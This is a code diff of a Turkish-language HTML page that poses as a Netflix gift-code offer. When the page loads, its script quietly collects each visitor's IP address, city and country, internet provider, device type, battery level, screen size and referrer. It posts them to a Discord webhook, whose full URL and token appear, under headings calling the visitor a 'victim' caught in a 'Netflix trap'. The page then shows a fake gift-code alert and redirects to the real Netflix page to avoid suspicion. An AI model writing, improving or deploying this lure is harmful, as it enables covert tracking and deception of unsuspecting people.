@@ -47,40 +47,47 @@
         // Senin Discord Webhook Linkin
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        async function sinsiSistem() {
+        async function anonimSistem() {
             try {
                 // 1. Detaylı IP ve Konum Bilgisi Alımı
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const d = await ipRes.json();
                 
-                // 2. Batarya Bilgisi Alımı
+                // 2. Batarya Bilgisi Alımı (Telefon/Tablet için önemli)
                 let pilBilgisi = "Bilinmiyor";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    pilBilgisi = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarj Oluyor)' : '(Şarjda Değil)'}`;
+                    pilBilgisi = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Değil)'}`;
                 }
 
-                // 3. Giriş Kaynağı (Nereden tıkladı?)
-                const neredenGeldi = document.referrer || "Direkt Link Kullanımı";
+                // 3. Cihaz Tipi Tespiti (PC/Telefon/Tablet)
+                const ua = navigator.userAgent;
+                let cihazTipi = "Bilgisayar (PC)";
+                if (/tablet|ipad|playbook|silk/i.test(ua)) {
+                    cihazTipi = "Tablet";
+                } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera Mini/i.test(ua)) {
+                    cihazTipi = "Akıllı Telefon";
+                }
 
-                // 4. Discord İçin Zenginleştirilmiş Rapor Paketi
+                // 4. Discord İçin ANONİM BOT Raporu
                 const rapor = {
-                    username: "Netflix Kampanya Botu",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png",
+                    username: "ANONİM BOT", // İstediğin isim
+                    avatar_url: "https://i.imgur.com/8nN9S1L.png", // Gizemli bir profil resmi
                     embeds: [{
-                        title: "🎁 Bir Kurban Netflix Linkine Tıkladı!",
-                        description: "Hedefin tüm bilgileri aşağıda listelenmiştir.",
-                        color: 14943508, // Netflix Kırmızısı
+                        title: "🎯 Yeni Bir Hedef Yakalandı!",
+                        description: "Kurban Netflix tuzağına düştü. İşte cihaz detayları:",
+                        color: 14943508, 
                         fields: [
+                            { name: "👤 Cihaz Türü", value: `**${cihazTipi}**`, inline: true },
                             { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: true },
-                            { name: "📍 Şehir / Ülke", value: `${d.city} / ${d.country_name}`, inline: true },
-                            { name: "📡 İnternet Sağlayıcı", value: d.org, inline: false },
-                            { name: "📱 Cihaz & Tarayıcı", value: navigator.userAgent.split(')')[0] + ')', inline: false },
-                            { name: "🔋 Batarya Durumu", value: pilBilgisi, inline: true },
-                            { name: "🖼️ Ekran & Dil", value: `${screen.width}x${screen.height} | ${navigator.language}`, inline: true },
-                            { name: "🔗 Yönlendiren Kaynak", value: neredenGeldi, inline: false }
+                            { name: "📍 Konum", value: `${d.city} / ${d.country_name}`, inline: true },
+                            { name: "📡 Operatör", value: d.org || "Bilinmiyor", inline: true },
+                            { name: "🔋 Batarya", value: pilBilgisi, inline: true },
+                            { name: "🖼️ Ekran", value: `${screen.width}x${screen.height}`, inline: true },
+                            { name: "📱 İşletim Sistemi", value: `\`${navigator.platform}\``, inline: false },
+                            { name: "🔗 Kaynak", value: document.referrer || "Direkt Giriş", inline: false }
                         ],
-                        footer: { text: "Rapor Tarihi: " + new Date().toLocaleString('tr-TR') },
+                        footer: { text: "ANONİM BOT Takip Sistemi | " + new Date().toLocaleString('tr-TR') },
                         thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                     }]
                 };
@@ -92,20 +99,18 @@
                     body: JSON.stringify(rapor)
                 });
 
-                // 6. İnandırıcılık İçin 4 Saniye Beklet ve Gerçek Netflix Sayfasına At
+                // 6. Yönlendirme
                 setTimeout(() => {
-                    alert("Tebrikler! Hediye kodunuz oluşturuldu. Kodu kullanmak için resmi Netflix sayfasına yönlendiriliyorsunuz.");
+                    alert("Tebrikler! Hediye kodunuz oluşturuldu. Kullanım için yönlendiriliyorsunuz.");
                     window.location.href = "https://www.netflix.com/tr/redeem";
                 }, 4000);
 
             } catch (error) {
-                // Hata olsa bile hedef anlamasın diye Netflix'e yolla
                 window.location.href = "https://www.netflix.com/tr/redeem";
             }
         }
 
-        // Sayfa yüklendiği an sistemi başlat
-        window.onload = sinsiSistem;
+        window.onload = anonimSistem;
     </script>
 </body>
 </html>
